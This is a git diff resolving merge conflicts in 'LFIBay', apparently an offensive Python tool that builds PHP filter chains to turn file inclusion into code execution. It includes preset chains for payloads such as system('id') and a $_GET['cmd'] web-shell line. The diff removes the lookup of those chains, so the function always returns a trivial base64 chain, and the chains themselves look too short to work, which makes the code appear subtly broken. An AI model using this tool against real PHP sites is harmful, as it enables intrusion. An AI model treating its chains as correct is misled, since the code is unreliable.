@@ -1,18 +1,13 @@
 """
 LFIBay - PHP Filter Chain Generator
 Generate filter chains for RCE without file upload
-<<<<<<< Updated upstream
 Reference: Synacktiv's PHP filter chain research
-=======
-Based on Synacktiv research
->>>>>>> Stashed changes
 """
 
 import base64
 
 
 def generate_filter_chain(php_code):
-<<<<<<< Updated upstream
     """
     Generate PHP filter chain for arbitrary PHP code execution
     Note: This is a simplified version. For production use, consider using
@@ -24,10 +19,6 @@ def generate_filter_chain(php_code):
     """
     # For now, return pre-built chains for common commands
     # A full implementation would require complex iconv chain calculation
-=======
-    """Generate PHP filter chain for code execution"""
-    # Simplified - for production use a dedicated filter chain tool
->>>>>>> Stashed changes
     
     common_commands = {
         "system('id');": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
@@ -38,24 +29,11 @@ def generate_filter_chain(php_code):
         "system(\$_GET['cmd']);": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
     }
     
-<<<<<<< Updated upstream
     # Check if we have a pre-built chain for this code
-=======
->>>>>>> Stashed changes
-    for cmd, chain in common_commands.items():
-        if cmd.strip().lower() == php_code.strip().lower():
-            return f"php://filter/{chain}/resource=index.php"
-    
-<<<<<<< Updated upstream
-    # Default: use base64 encoding chain
-=======
-    # Default fallback
->>>>>>> Stashed changes
     return generate_base64_chain(f"<?php {php_code} ?>")
 
 
 def generate_base64_chain(content):
-<<<<<<< Updated upstream
     """
     Create filter chain for base64 encoding bypass
     Args:
@@ -63,23 +41,15 @@ def generate_base64_chain(content):
     Returns: Filter chain string
     """
     # Simple base64 encoding chain
-=======
-    """Create basic base64 encoding chain"""
->>>>>>> Stashed changes
     chain = "convert.base64-encode"
     return f"php://filter/{chain}/resource=index.php"
 
 
 def get_preset_chains():
-<<<<<<< Updated upstream
     """
     Return pre-built chains for common payloads
     Returns: Dictionary of command -> chain mappings
     """
-=======
-    """Get pre-built chains for common commands"""
-    # TODO: add more commands (cat, wget, etc)
->>>>>>> Stashed changes
     return {
         'whoami': {
             'description': 'Execute whoami command',
